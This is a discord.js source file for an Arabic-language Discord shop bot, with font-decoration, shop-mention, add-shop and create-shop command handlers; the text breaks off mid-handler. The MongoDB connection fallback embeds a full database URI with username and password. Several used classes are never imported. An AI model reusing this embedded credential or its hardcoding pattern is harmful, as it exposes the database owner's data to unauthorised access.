const { Client,Collection,ComponentType, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fs = require("fs");
const path = require("path");

require('dotenv').config();
const { REST } = require("@discordjs/rest");
const { Routes } = require("discord-api-types/v9");
const { SlashCommandBuilder} = require("@discordjs/builders");
const Types = require("./Mangodb/types.js");
const client = new Client({
  intents: 131071,
});

// Increase max listeners to prevent warnings
client.setMaxListeners(20);

process.on('unhandledRejection', (error) => {
  console.error('حدث خطأ غير معالج:', error);
  // إذا كان الخطأ متعلق بـ BigInt
  if (error.message.includes('BigInt')) {
    console.log('⚠️ تم اكتشاف مشكلة BigInt في أحد الأوامر');
    console.log('Stack Trace:', error.stack);
  }
});
BigInt.prototype.toJSON = function() { return this.toString(); };
process.on("uncaughtException", (e) => {
  console.log(e);
});
process.on("uncaughtExceptionMonitor", (e) => {
  console.log(e);
});

//=================================== SLASH COMMAND ===============================//

module.exports = client;
client.commands = new Collection();
client.events = new Collection();
client.slashCommands = new Collection();
["commands", "events", "slash","functions"].forEach((handler) => {
  require(`./handlers/${handler}`)(client);
});

const commands = client.slashCommands.map(({ execute, ...data }) => data);
// Register slash commands globally
const rest = new REST({ version: "10" }).setToken(
  process.env.BOT_TOKEN
);

// Register commands globally (publicly)
if (process.env.CLIENT_ID) {
  rest
    .put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands })
    .then(() => console.log("✅ Successfully registered global application commands."))
    .catch((error) => {
      if (error.code === 50001) {
        console.error("❌ Missing Access: Bot doesn't have permission to register commands.");
        console.error("Make sure the bot has 'applications.commands' scope and appropriate permissions.");
      } else {
        console.error("❌ Error registering commands:", error.message);
      }
    });
} else {
  console.warn("⚠️ Warning: clientid not configured. Slash commands not registered.");
}
//=================================== SLASH COMMAND ===============================//

const Shop = require("./Mangodb/shop.js");
const Setup = require("./Mangodb/setup.js");
const Prefix = require("./Mangodb/prefix.js");
const WarnTime = require("./Mangodb/warn-time.js");


//================ 💻 تستطيع وضع اي كود تريده هنا =================//
//=================== الاصدار : 14 =========================//
const { startAutoPublishSystem, stopAllAutoPublish } = require('./handlers/autoPublishSystem');

// عند إيقاف البوت
process.on('SIGINT', () => {
  stopAllAutoPublish();
  process.exit(0);
});

const mongoose = require("mongoose");

mongoose
  .connect(
    process.env.MONGO_URI || "mongodb+srv://astaonly29:yPbUxFL1I5RAfOgA@cluster0.ajurzhr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => {
    console.log("✅ Connected to MongoDB!");
  })
  .catch((err) => {
    console.error("❌ Error connecting to MongoDB:", err);
  });

//=================== وضع اي كود تريده هنا ==============//
// Note: messageCreate event is already handled in events/shop/ or elsewhere
// Removed duplicate listener to prevent MaxListenersExceededWarning

//============= Ready =======================//

// This code should be in an event file, not duplicated here
// Removing duplicate ready listeners to prevent MaxListenersExceededWarning
//============= Message Create =======================//
const connectedLetters = ['ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'ي', 'ى', 'ة'];

// الحروف العربية الغير متصلة (لا ترتبط بالحرف الذي يليها)
const disconnectedLetters = ['أ', 'إ', 'آ', 'ا', 'د', 'ذ', 'ر', 'ز', 'و', 'ؤ', 'ء', ' '];

// دالة الزخرفة العربية المعدلة
const arabicTransform = (text) => {
  let result = '';
  const words = text.split(/(\s+)/);
  
  return words.map(word => {
    if (/\s/.test(word)) {
      return word; // إرجاع المسافات كما هي
    }
    
    let decoratedWord = '';
    for (let i = 0; i < word.length; i++) {
      const currentChar = word[i];
      const nextChar = word[i + 1];
      
      decoratedWord += currentChar;
      
      // إضافة ــ إذا كان الحرف متصل وليس آخر حرف في الكلمة
      // واستثناء حالة اللام إذا يليها ألف
      if (connectedLetters.includes(currentChar) && nextChar) {
        if (currentChar === 'ل' && nextChar === 'ا') {
          // لا تضيف ــ إذا كانت لام يليها ألف
          continue;
        }
        decoratedWord += 'ـ';
      }
    }
    
    return decoratedWord;
  }).join('');
};

// أنماط الزخرفة المختلفة
const fontStyles = {
  // الزخرفة العربية
  arabic: (text) => {
    return text
      .split(/(\s+)/)
      .map(part => {
        if (/\s/.test(part)) {
          return part;
        }
        return arabicTransform(part);
      })
      .join('');
  },

  // الزخارف الإنجليزية 1
  english1: (text) => {
    const englishMap1 = {
      'a': '𝖆', 'b': '𝖇', 'c': '𝖈', 'd': '𝖉', 'e': '𝖊',
      'f': '𝖋', 'g': '𝖌', 'h': '𝖍', 'i': '𝖎', 'j': '𝖏',
      'k': '𝖐', 'l': '𝖑', 'm': '𝖒', 'n': '𝖓', 'o': '𝖔',
      'p': '𝖕', 'q': '𝖖', 'r': '𝖗', 's': '𝖘', 't': '𝖙',
      'u': '𝖚', 'v': '𝖛', 'w': '𝖜', 'x': '𝖝', 'y': '𝖞', 'z': '𝖟',
      'A': '𝕬', 'B': '𝕭', 'C': '𝕮', 'D': '𝕯', 'E': '𝕰',
      'F': '𝕱', 'G': '𝕲', 'H': '𝕳', 'I': '𝕴', 'J': '𝕵',
      'K': '𝕶', 'L': '𝕷', 'M': '𝕸', 'N': '𝕹', 'O': '𝕺',
      'P': '𝕻', 'Q': '𝕼', 'R': '𝕽', 'S': '𝕾', 'T': '𝕿',
      'U': '𝖀', 'V': '𝖁', 'W': '𝖂', 'X': '𝖃', 'Y': '𝖄', 'Z': '𝖅',
      ' ': ' '
    };
    return text.split('').map(char => englishMap1[char] || char).join('');
  },

  // الزخارف الإنجليزية 2
  english2: (text) => {
    const englishMap2 = {
      'a': '𝒶', 'b': '𝒷', 'c': '𝒸', 'd': '𝒹', 'e': '𝑒',
      'f': '𝒻', 'g': '𝑔', 'h': '𝒽', 'i': '𝒾', 'j': '𝒿',
      'k': '𝓀', 'l': '𝓁', 'm': '𝓂', 'n': '𝓃', 'o': '𝑜',
      'p': '𝓅', 'q': '𝓆', 'r': '𝓇', 's': '𝓈', 't': '𝓉',
      'u': '𝓊', 'v': '𝓋', 'w': '𝓌', 'x': '𝓍', 'y': '𝓎', 'z': '𝓏',
      'A': '𝒜', 'B': '𝐵', 'C': '𝒞', 'D': '𝒟', 'E': '𝐸',
      'F': '𝐹', 'G': '𝒢', 'H': '𝐻', 'I': '𝐼', 'J': '𝒥',
      'K': '𝒦', 'L': '𝐿', 'M': '𝑀', 'N': '𝒩', 'O': '𝒪',
      'P': '𝒫', 'Q': '𝒬', 'R': '𝑅', 'S': '𝒮', 'T': '𝒯',
      'U': '𝒰', 'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
      ' ': ' '
    };
    return text.split('').map(char => englishMap2[char] || char).join('');
  },

  // الزخارف الإنجليزية 3
  english3: (text) => {
    const englishMap3 = {
      'a': '𝔞', 'b': '𝔟', 'c': '𝔠', 'd': '𝔡', 'e': '𝔢',
      'f': '𝔣', 'g': '𝔤', 'h': '𝔥', 'i': '𝔦', 'j': '𝔧',
      'k': '𝔨', 'l': '𝔩', 'm': '𝔪', 'n': '𝔫', 'o': '𝔬',
      'p': '𝔭', 'q': '𝔮', 'r': '𝔯', 's': '𝔰', 't': '𝔱',
      'u': '𝔲', 'v': '𝔳', 'w': '𝔴', 'x': '𝔵', 'y': '𝔶', 'z': '𝔷',
      'A': '𝔄', 'B': '𝔅', 'C': 'ℭ', 'D': '𝔇', 'E': '𝔈',
      'F': '𝔉', 'G': '𝔊', 'H': 'ℌ', 'I': 'ℑ', 'J': '𝔍',
      'K': '𝔎', 'L': '𝔏', 'M': '𝔐', 'N': '𝔑', 'O': '𝔒',
      'P': '𝔓', 'Q': '𝔔', 'R': 'ℜ', 'S': '𝔖', 'T': '𝔗',
      'U': '𝔘', 'V': '𝔙', 'W': '𝔚', 'X': '𝔛', 'Y': '𝔜', 'Z': 'ℨ',
      ' ': ' '
    };
    return text.split('').map(char => englishMap3[char] || char).join('');
  }
};

// دالة للتحقق إذا النص عربي
const isArabic = (text) => {
  const arabicRegex = /[\u0600-\u06FF]/;
  return arabicRegex.test(text);
};

// دالة للتحقق إذا النص إنجليزي
const isEnglish = (text) => {
  const englishRegex = /[a-zA-Z]/;
  return englishRegex.test(text);
};
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const fontWords = prefixData.font ? prefixData.font.split(",") : [];
  const setupData = await Setup.findOne({ guildId: message.guild.id });

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isFontCommand = 
    userInput.startsWith("+font") ||
    fontWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isFontCommand) return;

  // استخراج النص من الرسالة أو الملف
  let text = "";

  // إذا كان هناك مرفق ملف
  if (message.attachments.size > 0) {
    const attachment = message.attachments.first();
    
    // التحقق إذا كان الملف نصي (txt)
    if (attachment.name.endsWith('.txt')) {
      try {
        const response = await fetch(attachment.url);
        text = await response.text();
      } catch (error) {
        return message.reply({
          content: "**❌ فــشــل فــي قــراءة الــمــلــف**",
          ephemeral: true
        });
      }
    } else {
      return message.reply({
        content: "**❌ يــجــب أن يــكــون الــمــلــف مــن نــوع txt**",
        ephemeral: true
      });
    }
  } else {
    // استخراج النص من الرسالة
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply({
        content: "**❌ يــجــب كــتــابــة نــص بــعــد الأمــر أو إرفــاق مــلــف txt**",
        ephemeral: true
      });
    }
    text = args.slice(1).join(" ");
  }

  // التحقق من أن النص ليس فارغاً
  if (!text.trim()) {
    return message.reply({
      content: "**❌ الــنــص فــارغ، يــرجــى كــتــابــة نــص أو إرفــاق مــلــف يحتوي على نص**",
      ephemeral: true
    });
  }

  // إنشاء أزرار الاختيار
const row = new ActionRowBuilder()
  .addComponents(
    new ButtonBuilder()
      .setCustomId(`font_arabic_${message.id}`)
      .setLabel("الــخــط الاول")
      .setStyle(ButtonStyle.Primary),
    new ButtonBuilder()
      .setCustomId(`font_english1_${message.id}`)
      .setLabel("𝕱𝖔𝖓𝖙 2")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`font_english2_${message.id}`)
      .setLabel("𝓕𝓸𝓷𝓽 3")
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`font_english3_${message.id}`)
      .setLabel("𝔉𝔬𝔫𝔱 4")
      .setStyle(ButtonStyle.Danger)
  );



  const embed = new EmbedBuilder()
    .setAuthor({
      name: message.guild.name,
      iconURL: message.guild.iconURL({ dynamic: true })
    })
    .setTitle("اخــتــر نــوع الــزخــرفــة")
    .setDescription(`**الــنــص الــمــدخــل:**\n${text.length > 1000 ? text.substring(0, 1000) + '...' : text}`)
    .setColor("#0099ff")
    .setThumbnail(message.client.user.displayAvatarURL({ dynamic: true }))
    .setImage(setupData?.line || null)
    .setFooter({
      text: "Dev By Hox Devs",
      iconURL: message.guild.iconURL({ dynamic: true })
    });

  const replyMessage = await message.reply({
    embeds: [embed],
    components: [row]
  });

  // إنشاء collector للأزرار
  const filter = (interaction) => interaction.user.id === message.author.id;
  const collector = replyMessage.createMessageComponentCollector({
    filter,
    time: 60000
  });

  collector.on('collect', async (interaction) => {
    const [_, style, messageId] = interaction.customId.split('_');

    // التحقق من نوع النص ونوع الزخرفة
    if (style === 'arabic' && !isArabic(text)) {
      return interaction.reply({
        content: "**🤨 انــت عــبــيــط؟ الــنــص مــش عــربــي**",
        ephemeral: true
      });
    }

    if (style.startsWith('english') && !isEnglish(text)) {
      return interaction.reply({
        content: "**🤨 انــت عــبــيــط؟ الــنــص مــش انــجــلــيــزي**",
        ephemeral: true
      });
    }

    // تطبيق الزخرفة المختارة
    const decoratedText = fontStyles[style](text);

    // إذا كان النص طويلاً، نقوم بتقسيمه
    if (decoratedText.length > 2000) {
      // حفظ النص في ملف
      const buffer = Buffer.from(decoratedText, 'utf8');
      const attachment = new AttachmentBuilder(buffer, { name: 'decorated_text.txt' });
      
      await interaction.reply({
        content: "**✅ تــم زخــرفــة الــنــص، الــنــص طــويــل جــداً لــذا تــم إرســالــه كــمــلــف:**",
        files: [attachment],
        ephemeral: true
      });
    } else {
      await interaction.reply({
        content: `**الــنــص بــعــد الــزخــرفــة:**\n\`\`\`${decoratedText}\`\`\``,
        ephemeral: true
      });
    }

    // حذف رسالة الأزرار بعد الاختيار
    await replyMessage.delete().catch(() => {});
  });

  collector.on('end', collected => {
    if (collected.size === 0) {
      replyMessage.edit({
        content: "**❌ انــتــهــى الــوقــت الــمــحــدّد لــلــاخــتــيــار**",
        components: []
      }).catch(() => {});
    }
  });
});
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  const shopData = await Shop.findOne({
    guildId: message.guild.id,
    channelId: message.channel.id,
  });

  if (!shopData) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const mentionShopWords = prefixData.mentionShop ? prefixData.mentionShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق "-منشنات" أو أي من كلمات mention-shop
  const userInput = message.content.toLowerCase().trim();
  const isMentionCommand =
    userInput === "-منشنات" || // دي ثابتة
    mentionShopWords.some((word) => userInput === word.toLowerCase().trim());

  if (!isMentionCommand) return;

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("servic_shop")
      .setLabel("خـدمـات الـمـتـجـر")
      .setEmoji("<a:how_white_star:1414640440493474047>")
      .setStyle(ButtonStyle.Secondary),
          new ButtonBuilder()
      .setCustomId("ratings_main")
      .setLabel("تـقـيـيـمـات")
      .setEmoji("<a:hox_star_gray:1326824634397626478>")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId("tachfier")
      .setLabel("تـشـفـيـر")
      .setEmoji("<a:hox_dark_star:1414636210424381460>")
      .setStyle(ButtonStyle.Primary)
  );

  message.channel.send({
    content: `**مـنـشـنـات الـمـتـجـر :  

- <a:emoji_489:1326822702627164191> Everyone-: __${shopData.everyone}__
- <a:emoji_489:1326822702627164191> Here-: __${shopData.here}__
- <a:emoji_489:1326822702627164191> Shop-: __${shopData.shop}__**`,
    components: [row],
  });
});
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const addShopWords = prefixData.addDataShop ? prefixData.addDataShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isAddShopCommand = 
    userInput === "+اضافة" || // دي ثابتة
    addShopWords.some((word) => userInput === word.toLowerCase().trim());

  if (!isAddShopCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على المنشن
  const args = message.content.split(" ");
  if (args.length < 2) {
    const reply = await message.reply({
      content: "**❌ يــجــب ذكــر عــضــو بــعــد الأمــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // استخراج المنشن من الرسالة
  let sellerUser;
  try {
    sellerUser = message.mentions.users.first() || await client.users.fetch(args[1].replace(/[<@!>]/g, ''));
  } catch (error) {
    const reply = await message.reply({
      content: "**❌ لــم يــتــم الــعــثــور عــلــى الــعــضــو**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  if (sellerUser.bot) {
    const reply = await message.reply({
      content: "**بــتــحــط بــوت اونــر الــمــتــجــر شــارب انــت؟**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحميل أنواع المتاجر من MongoDB
  const types = await Types.find({ guildId: message.guild.id });
  if (!types || types.length === 0) {
    const reply = await message.reply({
      content: "**❌ لــم يــتــم الــعــثــور عــلــى أنــواع الــمــتــاجــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }
  
  // إنشاء أزرار للأنواع
  const rows = [];
  let currentRow = new ActionRowBuilder();
  
  for (let i = 0; i < types.length; i++) {
    if (i > 0 && i % 5 === 0) {
      rows.push(currentRow);
      currentRow = new ActionRowBuilder();
    }
    
    currentRow.addComponents(
      new ButtonBuilder()
        .setCustomId(`add_shop_type_${types[i].name}`)
        .setLabel(types[i].name)
        .setStyle(ButtonStyle.Primary)
    );
  }
  
  if (currentRow.components.length > 0) {
    rows.push(currentRow);
  }

  // إرسال رسالة مع الأزرار
  const typeMessage = await message.reply({
    content: `**اخــتــر نــوع الــمــتــجــر لــ <@${sellerUser.id}>:**`,
    components: rows,
  });

  // فلتر للأزرار
  const filter = (interaction) => interaction.user.id === message.author.id;
  const collector = typeMessage.createMessageComponentCollector({
    filter,
    componentType: ComponentType.Button,
    time: 60000,
  });

  collector.on('collect', async (interaction) => {
    if (interaction.customId.startsWith('add_shop_type_')) {
      const typeName = interaction.customId.replace('add_shop_type_', '');
      const selectedType = types.find(t => t.name === typeName);
      
      if (!selectedType) {
        await interaction.reply({
          content: "**❌ هــذا الــنــوع غــيــر مــوجــود**",
          ephemeral: true
        });
        return;
      }

      // استخدام بيانات النوع مباشرة
      const everyoneMention = selectedType.everyone || 0;
      const hereMention = selectedType.here || 0;
      const shopMention = selectedType.shop || 0;
      const maxWarns = selectedType.maxWarns || 3;

      const time = Math.floor(Date.now() / 1000);

      // إنشاء بيانات المتجر
      const shopData = new Shop({
        guildId: message.guild.id,
        channelId: null,
        ownerId: sellerUser.id,
        type: selectedType.name,
        maxWarns: maxWarns,
        time: `<t:${time}:R>`,
        emoji: selectedType.emoji || "",
        status: "1",
        vacation: "1",
        vacationData: {
          reason: "",
          duration: "",
          requestedAt: null,
          approvedAt: null,
          endsAt: null,
          approvedBy: ""
        },
        role: selectedType.role,
        everyone: everyoneMention,
        here: hereMention,
        shop: shopMention,
        warns: 0,
        partners: [],
        shape: selectedType.shape,
        tax: selectedType.tax ?? 0,
      });

      await shopData.save();

      const guild = message.guild;
      const line = setupData.line;
      const shopMentionRoleId = setupData.shopMention;

      // احضر اسم الرتبة إذا موجودة
      const role = message.guild.roles.cache.get(selectedType.role);
      const roleName = role ? role.name : "غير محدد";

      // إنشاء الإيمبد للمتجر
      const embedShop = new EmbedBuilder()
        .setTitle(`بــيــانــات مــتــجــر - ${selectedType.name}`)
        .setDescription(
          `**- ${selectedType.emoji || ""}  \`﹣\` صــاحــب الــمــتــجــر : <@${sellerUser.id}>\n` +
          `- ${selectedType.emoji || ""}  \`﹣\` نــوع الــمـتـجـر : ${roleName}\n` +
          `- ${selectedType.emoji || ""}  \`﹣\` تـاريـخ الانـشـاء :  <t:${time}:R>\n` +
          `- ${selectedType.emoji || ""}  \`﹣\` الــحــد الاقــصــي لــتــحــذيــرات :  ${maxWarns}\n\n` +
          `<a:hox_star_light:1326824621722435655> \`-\` __ @everyone :  \`${everyoneMention}\`__\n` +
          `<a:hox_star_gray:1326824634397626478> \`-\` __ @here :  \`${hereMention}\`	__\n` +
          `<a:hox_star_orange:1326824692648116407> \`-\` __ <@&${shopMentionRoleId}> :  \`${shopMention}\`__ **`
        )
        .setImage(line || null)
        .setAuthor({
          name: guild.name,
          iconURL: guild.iconURL(),
        })
        .setFooter({
          text: "Dev By Hox Devs",
          iconURL: guild.iconURL({ dynamic: true }),
        });

      // حذف رسالة الأزرار
      await typeMessage.delete().catch(() => {});

      // رد على الأمر مع منشن للبائع
      await message.reply({
        content: `**تـــم اضــافــة بــيــانــات مــتــجــر لــ <@${sellerUser.id}>**`,
        embeds: [embedShop],
      });

      // إضافة رتبة النوع للبائع (إذا موجودة)
      const memberSeller = await message.guild.members.fetch(sellerUser.id);
      if (memberSeller && selectedType.role) {
        await memberSeller.roles.add(selectedType.role);
      }

      // إرسال رسالة خاصة للبائع مع تفاصيل المتجر
      try {
        await sellerUser.send({
          content: `**تـــم اضــافــة بــيــانــات مــتــجــر لــك**`,
          embeds: [embedShop],
        });
      } catch (error) {
        console.error('Cannot send DM to user:', error);
      }

      // تسجيل الحدث في لوقز
      if (setupData.logs) {
        const logChannel = await client.channels.fetch(setupData.logs);
        if (logChannel) {
          const embedLog = new EmbedBuilder()
            .setTitle("تــم اضــافــة بــيــانــات مــتــجــر")
            .addFields(
              { name: "بـواسـطـة:", value: `<@${message.author.id}>`, inline: true },
              { name: "صـاحـب الــمـتـجـر:", value: `<@${sellerUser.id}>`, inline: true },
              { name: "نــوع الــمـتـجـر:", value: `${roleName}`, inline: true },
              { name: "مــنــشــنــات @everyone:", value: `${everyoneMention}`, inline: true },
              { name: "مــنــشــنــات @here:", value: `${hereMention}`, inline: true },
              { name: "مــنــشــنــات الــمــتــجــر:", value: `${shopMention}`, inline: true }
            )
            .setTimestamp();

          await logChannel.send({ embeds: [embedLog] });
        }
      }

      await interaction.deferUpdate();
    }
  });

  collector.on('end', collected => {
    if (collected.size === 0) {
      typeMessage.edit({
        content: "**❌ انــتــهــى الــوقــت الــمــحــدّد لــلــاخــتــيــار**",
        components: []
      }).catch(() => {});
    }
  });
});

// الأمر الثاني: create-shop (إنشاء المتجر)
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const createShopWords = prefixData.createShop ? prefixData.createShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isCreateShopCommand = 
    userInput === "+متجر" || // دي ثابتة
    createShopWords.some((word) => userInput === word.toLowerCase().trim());

  if (!isCreateShopCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على المنشن
  const args = message.content.split(" ");
  if (args.length < 2) {
    const reply = await message.reply({
      content: "**❌ يــجــب ذكــر عــضــو بــعــد الأمــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // استخراج المنشن من الرسالة
  let sellerUser;
  try {
    sellerUser = message.mentions.users.first() || await client.users.fetch(args[1].replace(/[<@!>]/g, ''));
  } catch (error) {
    const reply = await message.reply({
      content: "**❌ لــم يــتــم الــعــثــور عــلــى الــعــضــو**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  if (sellerUser.bot) {
    const reply = await message.reply({
      content: "**بــتــحــط بــوت اونــر الــمــتــجــر شــارب انــت؟**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحميل أنواع المتاجر من MongoDB
  const types = await Types.find({ guildId: message.guild.id });
  if (!types || types.length === 0) {
    const reply = await message.reply({
      content: "**❌ لــم يــتــم الــعــثــور عــلــى أنــواع الــمــتــاجــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }
  
  // إنشاء أزرار للأنواع
  const rows = [];
  let currentRow = new ActionRowBuilder();
  
  for (let i = 0; i < types.length; i++) {
    if (i > 0 && i % 5 === 0) {
      rows.push(currentRow);
      currentRow = new ActionRowBuilder();
    }
    
    currentRow.addComponents(
      new ButtonBuilder()
        .setCustomId(`create_shop_type_${types[i].name}`)
        .setLabel(types[i].name)
        .setStyle(ButtonStyle.Primary)
    );
  }
  
  if (currentRow.components.length > 0) {
    rows.push(currentRow);
  }

  // إرسال رسالة مع الأزرار
  const typeMessage = await message.reply({
    content: `**اخــتــر نــوع الــمــتــجــر لــ <@${sellerUser.id}>:**`,
    components: rows,
  });

  // فلتر للأزرار
  const filter = (interaction) => interaction.user.id === message.author.id;
  const collector = typeMessage.createMessageComponentCollector({
    filter,
    componentType: ComponentType.Button,
    time: 60000,
  });

  collector.on('collect', async (interaction) => {
    if (interaction.customId.startsWith('create_shop_type_')) {
      const typeName = interaction.customId.replace('create_shop_type_', '');
      const selectedType = types.find(t => t.name === typeName);
      
      if (!selectedType) {
        await interaction.reply({
          content: "**❌ هــذا الــنــوع غــيــر مــوجــود**",
          ephemeral: true
        });
        return;
      }

      // طلب اسم المتجر
      await interaction.update({
        content: `**تــم اخــتــيــار نــوع: ${selectedType.name}\n\nالــرجــاء ارســال اســم الــمــتــجــر:**`,
        components: [],
      });

      // جمع اسم المتجر
      const nameFilter = (m) => m.author.id === message.author.id;
      const nameCollector = message.channel.createMessageCollector({
        filter: nameFilter,
        time: 60000,
        max: 1
      });

      nameCollector.on('collect', async (nameMessage) => {
        let shopName = nameMessage.content;
        
        // حذف رسالة الاسم
        await nameMessage.delete().catch(() => {});

        // استبدال المسافات بالـ ・
        shopName = shopName.replace(/\s+/g, "・");

        // إنشاء قناة المتجر
        const channel = await message.guild.channels.create({
          name: `${selectedType.shape}・${shopName}`,
          type: ChannelType.GuildText,
          parent: selectedType.category,
          permissionOverwrites: [
            {
              id: sellerUser.id,
              allow: [
                PermissionsBitField.Flags.SendMessages,
                PermissionsBitField.Flags.MentionEveryone,
                PermissionsBitField.Flags.EmbedLinks,
                PermissionsBitField.Flags.AttachFiles,
                PermissionsBitField.Flags.ViewChannel,
              ],
            },
            {
              id: setupData.shopAdmin,
              allow: [PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel],
            },
            {
              id: message.guild.roles.everyone.id,
              deny: [PermissionsBitField.Flags.SendMessages],
              allow: [PermissionsBitField.Flags.ViewChannel],
            },
          ],
        });

        const time = Math.floor(Date.now() / 1000);

        // إنشاء بيانات المتجر
        const shopData = new Shop({
          guildId: message.guild.id,
          channelId: channel.id,
          ownerId: sellerUser.id,
          type: selectedType.name,
          maxWarns: selectedType.maxWarns || 3,
          time: `<t:${time}:R>`,
          emoji: selectedType.emoji || "",
          status: "1",
          vacation: "1",
          vacationData: {
            reason: "",
            duration: "",
            requestedAt: null,
            approvedAt: null,
            endsAt: null,
            approvedBy: ""
          },
          role: selectedType.role,
          everyone: selectedType.everyone || 0,
          here: selectedType.here || 0,
          shop: selectedType.shop || 0,
          warns: 0,
          partners: [],
          shape: selectedType.shape,
          tax: selectedType.tax ?? 0,
        });

        await shopData.save();

        const guild = message.guild;
        const line = setupData.line;
        const shopMentionRoleId = setupData.shopMention;

        // احضر اسم الرتبة إذا موجودة
        const role = message.guild.roles.cache.get(selectedType.role);
        const roleName = role ? role.name : "غير محدد";

        // إنشاء الإيمبد للمتجر
        const embedShop = new EmbedBuilder()
          .setTitle(channel.name)
          .setDescription(
            `**- ${selectedType.emoji || ""}  \`﹣\` صــاحــب الــمــتــجــر : <@${sellerUser.id}>\n` +
            `- ${selectedType.emoji || ""}  \`﹣\` نــوع الــمـتـجـر : ${roleName}\n` +
            `- ${selectedType.emoji || ""}  \`﹣\` تـاريـخ الانـشـاء :  <t:${time}:R>\n` +
            `- ${selectedType.emoji || ""}  \`﹣\` الــحــد الاقــصــي لــتــحــذيــرات :  ${selectedType.maxWarns || 3}\n\n` +
            `<a:hox_star_light:1326824621722435655> \`-\` __ @everyone :  \`${selectedType.everyone || 0}\`__\n` +
            `<a:hox_star_gray:1326824634397626478> \`-\` __ @here :  \`${selectedType.here || 0}\`	__\n` +
            `<a:hox_star_orange:1326824692648116407> \`-\` __ <@&${shopMentionRoleId}> :  \`${selectedType.shop || 0}\`__ **`
          )
          .setImage(line || null)
          .setAuthor({
            name: guild.name,
            iconURL: guild.iconURL(),
          })
          .setFooter({
            text: "Dev By Hox Devs",
            iconURL: guild.iconURL({ dynamic: true }),
          });

        // حذف رسالة الأزرار
        await typeMessage.delete().catch(() => {});

        // رد على الأمر مع منشن للبائع
        await message.reply({
          content: `**تـــم انــشــاء الــمــتــجــر: <#${channel.id}>**`,
          embeds: [embedShop],
        });

        // إرسال في قناة المتجر منشن للبائع
        await channel.send({
          content: `<@${sellerUser.id}>`,
          embeds: [embedShop],
        });

        // إضافة رتبة النوع للبائع (إذا موجودة)
        const memberSeller = await message.guild.members.fetch(sellerUser.id);
